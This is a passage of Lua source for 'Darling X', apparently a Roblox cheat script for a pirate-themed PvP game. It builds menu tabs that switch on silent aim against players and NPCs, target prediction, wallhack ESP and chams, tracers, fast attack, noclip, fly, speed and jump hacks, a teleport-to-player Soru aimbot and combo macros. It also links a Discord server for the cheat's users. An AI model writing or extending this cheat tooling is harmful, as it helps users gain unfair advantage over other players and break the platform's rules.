                    if _G.DarlingX_IgnoreSafeZone and isPlayerInSafeZone(player) then
                        return true
                    end
                    return false
                end
            end
        end)
    end
    task.spawn(hookAimbotTargetFilter)

    -- 1. Silent Aim & Combat Lock System (Top Card for Direct Access)
    local aimCard = CreateCard(AimbotPage, "Silent Aim")

    AddToggle(aimCard, "Player Silent Aim", "Redirect skills toward enemy players", false, function(state)
        local mod = RequireModule("modules/combat/player_aimbot.lua")
        if mod then
            if state then mod.enable() else mod.disable() end
        end
        Notify("Aimbot", "Player Silent Aim: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(aimCard, "NPC Silent Aim", "Redirect skills toward mobs and bosses", false, function(state)
        local mod = RequireModule("modules/combat/npc_aimbot.lua")
        if mod then
            if state then mod.enable() else mod.disable() end
        end
        Notify("Aimbot", "NPC Silent Aim: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(aimCard, "Show FOV Circle", "Display aim boundary circle", false, function(state)
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod then
            if state then fovMod.enable() else fovMod.disable() end
        end
        Notify("FOV", "FOV Circle: " .. (state and "Visible" or "Hidden"))
    end)

    AddToggle(aimCard, "Ignore Allies", "Do not target allied players", false, function(state)
        _G.DarlingX_IgnoreAllies = state
        hookAimbotTargetFilter()
        Notify("Aimbot", "Ignore Allies: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(aimCard, "Ignore PvP Off", "Do not target players with PvP disabled", false, function(state)
        _G.DarlingX_IgnorePvPOff = state
        hookAimbotTargetFilter()
        Notify("Aimbot", "Ignore PvP Off: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(aimCard, "Ignore Safe Zone", "Do not target players inside safe zones", false, function(state)
        _G.DarlingX_IgnoreSafeZone = state
        hookAimbotTargetFilter()
        Notify("Aimbot", "Ignore Safe Zone: " .. (state and "Enabled" or "Disabled"))
    end)



    AddChoice(aimCard, "Target Priority", { "Nearest", "Low HP", "Looking At Me" }, 1, function(val)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core then core.TargetPriority = val end
        _G.DarlingX.Settings.Aim.Priority = val
    end)

    AddChoice(aimCard, "Aim Mode", { "360", "FOV", "180" }, 1, function(val)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core then core.AimMode = val end
        _G.DarlingX.Settings.Aim.Mode = val
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod and fovMod.setAimMode then
            fovMod.setAimMode(val)
        end
    end)

    AddChoice(aimCard, "Target Hitbox", { "HumanoidRootPart", "Head", "UpperTorso" }, 1, function(val)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core then
            core.TargetHitbox = val
            core.TargetPart = val
        end
        _G.DarlingX.Settings.Aim.TargetPart = val
    end)

    AddSlider(aimCard, "Max Range", 100, 3000, 1000, 50, function(val)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core then core.MaxRange = val end
        _G.DarlingX.Settings.Aim.MaxRange = val
    end)

    AddToggle(aimCard, "Enable Target Prediction", "Calculates lead vector based on enemy velocity and ping", true, function(state)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core then core.PredictionEnabled = state end
        _G.DarlingX.Settings.Aim.Prediction = state
    end)

    AddSlider(aimCard, "Prediction Amount", 5, 30, 12, 1, function(val)
        local core = RequireModule("modules/combat/aimbot_core.lua")
        local factor = val / 100
        if core then core.PredictionAmount = factor end
        _G.DarlingX.Settings.Aim.PredictionAmount = factor
    end)

    -- 2. FOV Circle Customization Card
    local fovCard = CreateCard(AimbotPage, "Field of View")

    AddSlider(fovCard, "FOV Radius", 20, 600, 100, 5, function(val)
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod and fovMod.setRadius then fovMod.setRadius(val) end
        local core = RequireModule("modules/combat/aimbot_core.lua")
        if core and core.setFOVRadius then core.setFOVRadius(val) end
        _G.DarlingX.Settings.FOV.Radius = val
    end)

    AddChoice(fovCard, "FOV Position", { "Center", "Mouse" }, 1, function(val)
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod and fovMod.setMode then fovMod.setMode(val) end
        _G.DarlingX.Settings.FOV.Mode = val
    end)

    AddChoice(fovCard, "FOV Color", { "Rainbow", "Purple", "Blue", "Pink", "Green", "Yellow", "Orange", "Red", "Cyan", "White" }, 1, function(val)
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod then
            if val == "Rainbow" then
                if fovMod.setRainbow then fovMod.setRainbow(true) end
            else
                if fovMod.setRainbow then fovMod.setRainbow(false) end
                local col = THEMES[val] or Color3.fromRGB(255, 255, 255)
                if fovMod.setColor then fovMod.setColor(col) end
            end
        end
    end)

    AddSlider(fovCard, "FOV Thickness", 1, 8, 2, 1, function(val)
        local fovMod = RequireModule("modules/combat/fov.lua")
        if fovMod and fovMod.setThickness then fovMod.setThickness(val) end
    end)

    -- 3. Tracers Card (Hardware 3D Beams & 2D Lines)
    local tracersCard = CreateCard(AimbotPage, "Tracers")

    AddToggle(tracersCard, "Show Tracers", "Renders hardware 3D Beams and 2D lines to target", false, function(state)
        local mod = RequireModule("modules/combat/tracers.lua")
        if mod then
            if state then mod.enable() else mod.disable() end
        end
        Notify("Tracers", "Tracers: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(tracersCard, "Tracer Mode", { "Both", "3D Beam", "2D Line" }, 1, function(val)
        local mod = RequireModule("modules/combat/tracers.lua")
        if mod and mod.setType then mod.setType(val) end
        _G.DarlingX.Settings.Tracers.Type = val
    end)

    AddChoice(tracersCard, "Tracer Origin", { "Player", "Bottom", "Center", "Mouse" }, 1, function(val)
        local mod = RequireModule("modules/combat/tracers.lua")
        if mod and mod.setOrigin then mod.setOrigin(val) end
        _G.DarlingX.Settings.Tracers.Origin = val
    end)

    AddChoice(tracersCard, "Tracer Color", { "Rainbow", "Purple", "Blue", "Pink", "Green", "Yellow", "Orange", "Red", "Cyan", "White" }, 1, function(val)
        local mod = RequireModule("modules/combat/tracers.lua")
        if mod then
            if val == "Rainbow" then
                if mod.setRainbow then mod.setRainbow(true) end
            else
                if mod.setRainbow then mod.setRainbow(false) end
                local col = THEMES[val] or Color3.fromRGB(255, 255, 255)
                if mod.setColor then mod.setColor(col) end
            end
        end
    end)

    AddSlider(tracersCard, "Tracer Thickness", 1, 6, 2, 1, function(val)
        local mod = RequireModule("modules/combat/tracers.lua")
        if mod and mod.setThickness then mod.setThickness(val) end
    end)

    -- 4. Skill Blacklist Card
    local blCard = CreateCard(AimbotPage, "Skill Blacklist")
    local blSkills = {
        { name = "Melee Z", cat = "Melee", key = "Z" },
        { name = "Melee X", cat = "Melee", key = "X" },
        { name = "Melee C", cat = "Melee", key = "C" },
        { name = "Sword Z", cat = "Sword", key = "Z" },
        { name = "Sword X", cat = "Sword", key = "X" },
        { name = "Fruit Z", cat = "Fruit", key = "Z" },
        { name = "Fruit X", cat = "Fruit", key = "X" },
        { name = "Fruit C", cat = "Fruit", key = "C" },
        { name = "Fruit V", cat = "Fruit", key = "V" },
        { name = "Fruit F", cat = "Fruit", key = "F" },
        { name = "Fruit TAP", cat = "Fruit", key = "TAP" },
        { name = "Gun Z", cat = "Gun", key = "Z" },
        { name = "Gun X", cat = "Gun", key = "X" },
    }

    local blGrid = Instance.new("Frame", blCard)
    blGrid.Name = "BlacklistGrid"
    blGrid.Size = UDim2.new(1, 0, 0, 225)
    blGrid.BackgroundTransparency = 1
    blGrid.ZIndex = 11
    local blLayout = Instance.new("UIGridLayout", blGrid)
    blLayout.CellSize = UDim2.new(0.5, -4, 0, 26)
    blLayout.CellPadding = UDim2.new(0, 8, 0, 5)
    blLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        blGrid.Size = UDim2.new(1, 0, 0, math.max(blLayout.AbsoluteContentSize.Y, 225))
        UpdateCardGeometry(blCard)
    end)

    for _, s in ipairs(blSkills) do
        local isBlacklisted = false
        local bBtn = Instance.new("TextButton", blGrid)
        bBtn.Name = "BL_" .. s.name:gsub("%s+", "_")
        bBtn.BackgroundColor3 = Color3.fromRGB(22, 18, 30)
        bBtn.BackgroundTransparency = 0.5
        bBtn.Text = s.name .. ": ALLOWED"
        bBtn.TextColor3 = Color3.fromRGB(200, 195, 215)
        bBtn.Font = Enum.Font.GothamBold
        bBtn.TextSize = 8
        bBtn.Active = true
        bBtn.Selectable = true
        bBtn.ZIndex = 12
        Instance.new("UICorner", bBtn).CornerRadius = UDim.new(0, 6)
        local stroke = Instance.new("UIStroke", bBtn)
        stroke.Thickness = 0.8
        stroke.Color = Color3.fromRGB(55, 50, 75)

        ConnectButton(bBtn, function()
            isBlacklisted = not isBlacklisted
            bBtn.Text = s.name .. ": " .. (isBlacklisted and "EXCLUDED" or "ALLOWED")
            bBtn.TextColor3 = isBlacklisted and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(200, 195, 215)
            stroke.Color = isBlacklisted and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(55, 50, 75)

            local blMod = RequireModule("modules/combat/blacklist.lua")
            if blMod then
                if isBlacklisted then
                    blMod.add(s.cat, s.key)
                else
                    blMod.remove(s.cat, s.key)
                end
            end
        end)
    end
    UpdateCardGeometry(blCard)
end)
if not okAimbot then
    warn("[Darling X] Failed to initialize AimbotPage: " .. tostring(errAimbot))
end

-- 3. PVP COMBAT & MOVEMENT TAB
local PvPPage = RegisterTab("PvP", "PvP", "swords")
local okPvP, errPvP = pcall(function()
    task.spawn(function()
        pcall(function()
            M.getFastAttack()
            M.getDragonGun()
            M.getSanguineBoost()
            M.getExtraWidgets()
            M.getAutoCombat()
            M.getCamlock()
            M.getMoveMod()
        end)
    end)

    -- 1. Combat Passives & Auto Skills
    local combatCard = CreateCard(PvPPage, "Auto Combat")

    AddToggle(combatCard, "Fast Attack", "Rapid melee and weapon strikes", false, function(state)
        _G.DarlingX_FastAttack = state
        local fa = M.getFastAttack(); if fa then
            if state then fa.enable() else fa.disable() end
        end
        Notify("PvP", "Fast Attack: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(combatCard, "Auto Buso Haki", "Keep Armament Haki active", false, function(state)
        local ac = M.getAutoCombat(); if ac then ac.SetAutoBuso(state) end
        Notify("PvP", "Auto Buso: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(combatCard, "Auto Race V3", "Cast Race V3 when in combat", false, function(state)
        local ac = M.getAutoCombat(); if ac then ac.SetAutoV3(state) end
        Notify("PvP", "Auto V3: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(combatCard, "Auto Race V4", "Cast Race V4 when gauge is full", false, function(state)
        local ac = M.getAutoCombat(); if ac then ac.SetAutoV4(state) end
        Notify("PvP", "Auto V4: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(combatCard, "Dragon Gun M1", "Rapid fire M1 gun shots", false, function(state)
        _G.DarlingX_DragonM1Enabled = state
        local dg = M.getDragonGun(); if dg then dg.SetEnabled(state) end
        local ew = M.getExtraWidgets(); if ew then ew.SetDragonM1WidgetVisible(state); ew.UpdateDragonM1Visual(state) end
        Notify("PvP", "Dragon Gun M1: " .. (state and "Enabled" or "Disabled"))
    end)

    -- 2. PvP Tech, Camlock & Universal Keybinds
    local techCard = CreateCard(PvPPage, "Combat Tech")

    AddToggle(techCard, "Camlock", "Lock camera onto enemy", false, function(state)
        local cl = M.getCamlock(); if cl then cl.SetEnabled(state) end
    end)

    AddToggle(techCard, "Sanguine Boost", "Forward velocity boost", false, function(state)
        _G.DarlingX_SanguineBoost = state
        local sb = M.getSanguineBoost(); if sb then sb.SetEnabled(state) end
        local ew = M.getExtraWidgets(); if ew then ew.SetSanguineWidgetVisible(state) end
        Notify("PvP", "Sanguine Boost: " .. (state and "Active" or "Inactive"))
    end)

    local sanguineKey = "None"
    AddChoice(techCard, "Camlock Keybind", { "C", "Q", "E", "R", "T", "X", "V", "B", "None" }, 1, function(val)
        local cl = M.getCamlock(); if cl then cl.SetKeybind(val) end
    end)

    AddChoice(techCard, "Sanguine Keybind", { "None", "Z", "Q", "E", "R", "T", "X", "C", "V", "B" }, 1, function(val)
        sanguineKey = val
    end)

    AddSlider(techCard, "Camera FOV", 70, 120, 70, 5, function(val)
        local cl = M.getCamlock(); if cl then cl.SetCameraFOV(val) end
    end)

    UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
        local key = input.KeyCode.Name
        if sanguineKey ~= "None" and key == sanguineKey then
            local sb = M.getSanguineBoost(); if sb then sb.Trigger() end
        end
    end)

    -- 3. Movement & Agility (PvP Physics)
    local moveCard = CreateCard(PvPPage, "Movement")

    AddToggle(moveCard, "Custom WalkSpeed", "Speed up player movement", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetWalkSpeed(state) end
        Notify("PvP", "WalkSpeed: " .. (state and "Enabled" or "Disabled"))
    end)

    AddSlider(moveCard, "WalkSpeed Value", 16, 500, 150, 5, function(val)
        local mm = M.getMoveMod(); if mm then mm.SetWalkSpeedValue(val) end
    end)

    AddToggle(moveCard, "Custom Dash Length", "Increase dash distance", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetDashLength(state) end
        Notify("PvP", "Dash Length: " .. (state and "Enabled" or "Disabled"))
    end)

    AddSlider(moveCard, "Dash Distance", 15, 150, 30, 5, function(val)
        local mm = M.getMoveMod(); if mm then mm.SetDashDistance(val) end
    end)

    AddToggle(moveCard, "Super Jump", "High jump leap", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetSuperJump(state) end
        Notify("PvP", "Super Jump: " .. (state and "Enabled" or "Disabled"))
    end)

    AddSlider(moveCard, "Super Jump Force", 50, 350, 216, 5, function(val)
        local mm = M.getMoveMod(); if mm then mm.SetSuperJumpPower(val) end
    end)

    AddToggle(moveCard, "Infinite Jump", "Jump continuously in mid-air", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetInfiniteJump(state) end
        Notify("PvP", "Infinite Jump: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(moveCard, "Noclip Wallpass", "Pass through walls and objects", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetNoclip(state) end
        Notify("PvP", "Noclip: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(moveCard, "Walk on Water", "Walk on ocean surface", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetWalkOnWater(state) end
        Notify("PvP", "Walk on Water: " .. (state and "Enabled" or "Disabled"))
    end)

    AddToggle(moveCard, "Anti-Lava Damage", "Immunity to lava damage", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetAntiLava(state) end
        Notify("PvP", "Anti-Lava: " .. (state and "Active" or "Disabled"))
    end)

    AddToggle(moveCard, "Fly", "Glide freely through the air", false, function(state)
        local mm = M.getMoveMod(); if mm then mm.SetFly(state) end
        Notify("PvP", "Fly: " .. (state and "Enabled" or "Disabled"))
    end)

    AddSlider(moveCard, "Fly Speed", 20, 500, 70, 5, function(val)
        local mm = M.getMoveMod(); if mm then mm.SetFlySpeed(val) end
    end)

    -- 4. Fast Flags & Engine Tuning
    local fflagCard = CreateCard(PvPPage, "Fast Flags")

    AddToggle(fflagCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
        SetFFlags1(state)
    end)

    AddToggle(fflagCard, "No Animations", "Stops non-attack animations to fix sideways bug and character freezes", false, function(state)
        SetNoAnimations(state)
    end)

    AddButton(fflagCard, "Apply Fast FFlags", function()
        ApplyFastFFlags()
    end)
end)
if not okPvP then
    warn("[Darling X] Failed to initialize PvPPage: " .. tostring(errPvP))
end
-- 4. MACRO TAB (SMART COMBO SUITE)
local MacroPage = RegisterTab("Macro", "Macro", "bot")
local okMacro, errMacro = pcall(function()
    local macroTabMod = RequireModule("modules/macro/macro_tab.lua")
    if macroTabMod and macroTabMod.Build then
        macroTabMod.Build(MacroPage, {
            CreateCard = CreateCard,
            AddToggle = AddToggle,
            AddChoice = AddChoice,
            AddButton = AddButton,
            Notify = Notify,
            RequireModule = RequireModule
        })
    end
end)
if not okMacro then
    warn("[Darling X] Failed to initialize MacroPage: " .. tostring(errMacro))
end

-- 5. SORU TAB (FLASHSTEP INTEGRATION)
local SoruPage = RegisterTab("Soru", "Soru", "zap")
local okSoru, errSoru = pcall(function()
    local soruMod = nil
    local function getSoruMod()
        if not soruMod then soruMod = RequireModule("modules/soru/soru_controller.lua") end
        return soruMod
    end
    task.spawn(function() pcall(getSoruMod) end)

    -- 1. Soru Flashstep Engine
    local cdCard = CreateCard(SoruPage, "Infinite Soru")

    AddToggle(cdCard, "Infinite Soru", "Remove flashstep cooldown", false, function(state)
        local sm = getSoruMod(); if sm and sm.setInfinite then sm.setInfinite(state) end
        Notify("Soru", "Infinite Soru: " .. (state and "Enabled" or "Disabled"))
    end)

    -- 2. Soru Combat Aimbot
    local aimCard = CreateCard(SoruPage, "Soru Aimbot")

    AddToggle(aimCard, "Soru Aimbot", "Teleport soru directly to enemy", false, function(state)
        local sm = getSoruMod(); if sm and sm.setAimbot then sm.setAimbot(state) end
        Notify("Soru", "Soru Aimbot: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(aimCard, "Soru Target Mode", { "Nearest Player", "Selected Player" }, 1, function(val)
        local sm = getSoruMod(); if sm then sm.TargetMode = val end
    end)

    local playerList = { "None" }
    pcall(function()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= lp then table.insert(playerList, p.Name) end
        end
    end)
    AddChoice(aimCard, "Target Player Selection", playerList, 1, function(val)
        local sm = getSoruMod(); if sm then sm.SelectedPlayer = (val ~= "None" and val or nil) end
    end)

    AddSlider(aimCard, "Max Soru Range", 200, 3000, 2000, 100, function(val)
        local sm = getSoruMod(); if sm then sm.MaxDistance = val end
    end)

    -- 3. Soru Skill Combo Automation
    local comboCard = CreateCard(SoruPage, "Soru Skill Combo")

    AddToggle(comboCard, "Auto Skill on Soru", "Use skill instantly after Soru", false, function(state)
        local sm = getSoruMod(); if sm and sm.setSkillCombo then sm.setSkillCombo(state) end
        Notify("Soru", "Skill Combo: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(comboCard, "Combo Weapon", { "Fruit", "Melee", "Sword", "Gun" }, 1, function(val)
        local sm = getSoruMod(); if sm then sm.SkillWeapon = val end
    end)

    AddChoice(comboCard, "Combo Key", { "Z", "X", "C", "V", "F" }, 1, function(val)
        local sm = getSoruMod(); if sm then sm.SkillKey = val end
    end)

    AddSlider(comboCard, "Skill Delay", 50, 800, 300, 25, function(val)
        local sm = getSoruMod(); if sm then sm.SkillDelay = val / 1000 end
    end)
end)
if not okSoru then
    warn("[Darling X] Failed to initialize SoruPage: " .. tostring(errSoru))
end

-- 6. ESP TAB (STRICTLY PVP COMBAT RADAR)
local ESPPage = RegisterTab("Esp", "Visuals", "eye")
local okESP, errESP = pcall(function()
    local espMod = nil
    local function getEspMod()
        if not espMod then espMod = RequireModule("modules/esp/esp_pvp.lua") end
        return espMod
    end
    task.spawn(function() pcall(getEspMod) end)
    local espControls = {}

    -- 1. Master Visuals & Chams
    local radarCard = CreateCard(ESPPage, "ESP Visuals")

    local masterToggle = AddToggle(radarCard, "Master ESP", "Enable player visual highlights", false, function(state)
        local em = getEspMod(); if em and em.toggle then em.toggle(state) end
        Notify("ESP", "Player ESP: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(radarCard, "ESP Style", { "2D Boxes", "Overhead Billboard" }, 1, function(val)
        local em = getEspMod(); if em then em.Style = val:find("Billboard") and "Overhead Billboard" or "2D Boxes" end
        Notify("ESP", "Style: " .. val)
    end)

    -- Quick Action Row: Enable All / Disable All
    local quickRow = Instance.new("Frame", radarCard)
    quickRow.Size = UDim2.new(1, 0, 0, 26)
    quickRow.BackgroundTransparency = 1
    local qLayout = Instance.new("UIGridLayout", quickRow)
    qLayout.CellSize = UDim2.new(0.5, -4, 1, 0)
    qLayout.CellPadding = UDim2.new(0, 8, 0, 0)

    local function makeQuickBtn(txt, callback)
        local btn = Instance.new("TextButton", quickRow)
        btn.BackgroundColor3 = Color3.fromRGB(22, 18, 32)
        btn.BackgroundTransparency = 0.45
        btn.Text = txt
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 8.5
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Selectable = true
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        local bStr = Instance.new("UIStroke", btn)
        bStr.Color = CurrentAccent
        bStr.Thickness = 0.8
        bStr.Transparency = 0.5
        RegisterThemeStroke(bStr)
        ConnectButton(btn, callback)
        RegisterTranslatable(btn, txt)
        return btn
    end

    makeQuickBtn("Enable All Visuals", function()
        if espMod and espMod.toggle then espMod.toggle(true) end
        if masterToggle and masterToggle.SetState then masterToggle.SetState(true, false) end
        for name, ctrl in pairs(espControls) do
            if ctrl and ctrl.SetState then ctrl.SetState(true, true) end
        end
        Notify("ESP", "All Player ESP Visuals: Enabled")
    end)

    makeQuickBtn("Disable All Visuals", function()
        if espMod and espMod.toggle then espMod.toggle(false) end
        if masterToggle and masterToggle.SetState then masterToggle.SetState(false, false) end
        for name, ctrl in pairs(espControls) do
            if ctrl and ctrl.SetState then ctrl.SetState(false, true) end
        end
        Notify("ESP", "All Player ESP Visuals: Disabled")
    end)

    -- 2. Player Radar Elements
    local elementsCard = CreateCard(ESPPage, "Radar Elements")

    espControls.Boxes = AddToggle(elementsCard, "Player 2D Boxes", "Draws dynamic bounding boxes around enemy players", true, function(state)
        if espMod then espMod.Boxes = state end
    end)

    espControls.Names = AddToggle(elementsCard, "Player Names", "Displays formatted usernames above character heads", true, function(state)
        if espMod then espMod.Names = state end
    end)

    espControls.Health = AddToggle(elementsCard, "Player Health Status", "Displays live gradient health bars and HP percentage", true, function(state)
        if espMod then espMod.Health = state end
    end)

    espControls.Distance = AddToggle(elementsCard, "Distance Indicator", "Shows distance measurement in studs below player feet", true, function(state)
        if espMod then espMod.Distance = state end
    end)

    espControls.Tool = AddToggle(elementsCard, "Equipped Tool / Weapon", "Shows weapon, sword, fruit or gun held by the player", true, function(state)
        if espMod then espMod.Tool = state end
    end)

    espControls.Fruit = AddToggle(elementsCard, "Devil Fruit Tracker", "Identifies equipped Devil Fruit power (Kitsune, Portal, etc.)", true, function(state)
        if espMod then espMod.Fruit = state end
    end)

    espControls.Bounty = AddToggle(elementsCard, "Player Bounty Tracker", "Displays player bounty or honor value in millions", true, function(state)
        if espMod then espMod.Bounty = state end
    end)

    espControls.Level = AddToggle(elementsCard, "Player Level Display", "Shows player rank and numerical level tag", true, function(state)
        if espMod then espMod.Level = state end
    end)

    espControls.PvPStatus = AddToggle(elementsCard, "Combat PvP Status", "Detects safe zone and in-combat status indicators", true, function(state)
        if espMod then espMod.PvPStatus = state end
    end)

    -- 3. Chams & Tracers
    local chamsCard = CreateCard(ESPPage, "Chams & Tracers")

    espControls.Chams = AddToggle(chamsCard, "Player Chams (Highlight)", "Illuminates full player character models through walls", false, function(state)
        if espMod then espMod.Chams = state end
        Notify("ESP", "Chams: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(chamsCard, "Chams Highlight Color", { "Red", "Purple", "Pink", "Blue", "Green", "Cyan", "Yellow", "White" }, 1, function(val)
        if espMod then
            local col = THEMES[val] or Color3.fromRGB(244, 63, 94)
            espMod.ChamsColor = col
        end
    end)

    espControls.Tracers = AddToggle(chamsCard, "Player Tracers", "Draws line from bottom of screen to tracked players", false, function(state)
        if espMod then espMod.Tracers = state end
        Notify("ESP", "Tracers: " .. (state and "Enabled" or "Disabled"))
    end)

    AddChoice(chamsCard, "Player Tracer Color", { "White", "Red", "Purple", "Pink", "Blue", "Green", "Cyan", "Yellow" }, 1, function(val)
        if espMod then
            local col = THEMES[val] or Color3.fromRGB(255, 255, 255)
            espMod.TracerColor = col
        end
    end)

    AddSlider(chamsCard, "ESP Text Font Size", 10, 22, 13, 1, function(val)
        if espMod then espMod.TextSize = val end
    end)
end)
if not okESP then
    warn("[Darling X] Failed to initialize ESPPage: " .. tostring(errESP))
end
-- 6. CONFIG TAB
local ConfigPage = RegisterTab("Config", "Config", "sliders-horizontal")
local MiscPage = ConfigPage
Pages["Misc"] = ConfigPage
Pages["Config"] = ConfigPage
local okMisc, errMisc = pcall(function()
    -- 1. Player Profile & Account Identity
    local playerCard = CreateCard(ConfigPage, "Player Profile")

    local playerRow = Instance.new("Frame", playerCard)
    playerRow.Name = "PlayerInfoRow"
    playerRow.Size = UDim2.new(1, 0, 0, 68)
    playerRow.BackgroundColor3 = Color3.fromRGB(18, 14, 26)
    playerRow.BackgroundTransparency = 0.4
    playerRow.ZIndex = 12
    Instance.new("UICorner", playerRow).CornerRadius = UDim.new(0, 8)
    local plStroke = Instance.new("UIStroke", playerRow)
    plStroke.Color = Color3.fromRGB(60, 50, 80)
    plStroke.Thickness = 0.8

    local pAvatar = Instance.new("ImageLabel", playerRow)
    pAvatar.Name = "PlayerAvatar"
    pAvatar.Size = UDim2.new(0, 48, 0, 48)
    pAvatar.Position = UDim2.new(0, 10, 0.5, -24)
    pAvatar.BackgroundColor3 = Color3.fromRGB(30, 24, 42)
    pAvatar.BackgroundTransparency = 0.2
    pAvatar.ZIndex = 13
    Instance.new("UICorner", pAvatar).CornerRadius = UDim.new(0, 8)
    local paStroke = Instance.new("UIStroke", pAvatar)
    paStroke.Color = CurrentAccent
    paStroke.Thickness = 1
    RegisterThemeStroke(paStroke)

    pcall(function()
        if lp and lp.UserId then
            pAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp.UserId) .. "&width=150&height=150&format=png"
        end
    end)

    local pInfo = Instance.new("Frame", playerRow)
    pInfo.Name = "PlayerDetails"
    pInfo.Size = UDim2.new(1, -72, 1, 0)
    pInfo.Position = UDim2.new(0, 68, 0, 0)
    pInfo.BackgroundTransparency = 1
    pInfo.ZIndex = 13

    local pName = Instance.new("TextLabel", pInfo)
    pName.Name = "DisplayName"
    pName.Size = UDim2.new(1, 0, 0, 20)
    pName.Position = UDim2.new(0, 0, 0, 8)
    pName.BackgroundTransparency = 1
    pName.Text = (lp and lp.DisplayName) and (lp.DisplayName .. " (@" .. lp.Name .. ")") or "Player"
    pName.TextColor3 = Color3.fromRGB(255, 255, 255)
    pName.Font = Enum.Font.GothamBold
    pName.TextSize = 12.5
    pName.TextXAlignment = Enum.TextXAlignment.Left
    pName.ZIndex = 13

    local pSub = Instance.new("TextLabel", pInfo)
    pSub.Name = "AccountMeta"
    pSub.Size = UDim2.new(1, 0, 0, 16)
    pSub.Position = UDim2.new(0, 0, 0, 28)
    pSub.BackgroundTransparency = 1
    local accAge = (lp and lp.AccountAge) and tostring(lp.AccountAge) .. " days" or "Unknown"
    local uid = (lp and lp.UserId) and tostring(lp.UserId) or "0"
    pSub.Text = "Account Age: " .. accAge .. "  •  UID: " .. uid
    pSub.TextColor3 = CurrentAccent
    pSub.Font = Enum.Font.GothamMedium
    pSub.TextSize = 9
    pSub.TextXAlignment = Enum.TextXAlignment.Left
    pSub.ZIndex = 13
    RegisterThemeText(pSub)

    local pRank = Instance.new("TextLabel", pInfo)
    pRank.Name = "StatusRank"
    pRank.Size = UDim2.new(1, 0, 0, 14)
    pRank.Position = UDim2.new(0, 0, 0, 44)
    pRank.BackgroundTransparency = 1
    pRank.Text = "Premium User  •  Active Session"
    RegisterTranslatable(pRank, "Premium User  •  Active Session")
    pRank.TextColor3 = Color3.fromRGB(180, 175, 200)
    pRank.Font = Enum.Font.Gotham
    pRank.TextSize = 8.5
    pRank.TextXAlignment = Enum.TextXAlignment.Left
    pRank.ZIndex = 13

    UpdateCardGeometry(playerCard)

    -- 2. Official Community & Discord
    local communityCard = CreateCard(ConfigPage, "Community")

    AddButton(communityCard, "Copy Discord Invite Link", function()
        local discordUrl = "https://discord.gg/DyG2BSMfVg"
        local copied = false
        if setclipboard then
            pcall(setclipboard, discordUrl)
            copied = true
        elseif toclipboard then
            pcall(toclipboard, discordUrl)
            copied = true
        end
        Notify("Discord", copied and "Link copied to clipboard!" or discordUrl)
    end)

    -- 3. Language & Localization
    local langCard = CreateCard(ConfigPage, "Language")
    AddChoice(langCard, "Interface Language", { "English", "Spanish", "Portuguese", "French", "Vietnamese" }, 1, function(val)
        ApplyLanguage(val)
        Notify("Language", "Language set to " .. val)
    end)

    -- 4. World & Client Optimization
    local clientCard = CreateCard(ConfigPage, "Performance")

    AddToggle(clientCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
        SetFFlags1(state)
    end)

    AddToggle(clientCard, "No Animations", "Stops non-attack animations to fix sideways bug and character freezes", false, function(state)
        SetNoAnimations(state)
    end)

    AddButton(clientCard, "Apply Fast FFlags", function()
        ApplyFastFFlags()
    end)

    AddButton(clientCard, "Rejoin Current Server", function()
        RejoinServer()
    end)

    -- 5. Configuration Profiles
    local configCard = CreateCard(ConfigPage, "Config")

    AddButton(configCard, "Reset Config", function()
        if ResetConfigProfile then
            ResetConfigProfile()
        end
    end)

    -- 6. Development Team & Content Creators
    local creditsCard = CreateCard(ConfigPage, "Credits")

    local creatorRow = Instance.new("Frame", creditsCard)
    creatorRow.Size = UDim2.new(1, 0, 0, 70)
    creatorRow.BackgroundColor3 = Color3.fromRGB(18, 14, 26)
    creatorRow.BackgroundTransparency = 0.4
    Instance.new("UICorner", creatorRow).CornerRadius = UDim.new(0, 8)
    local crStroke = Instance.new("UIStroke", creatorRow)
    crStroke.Color = Color3.fromRGB(60, 50, 80)
    crStroke.Thickness = 0.8

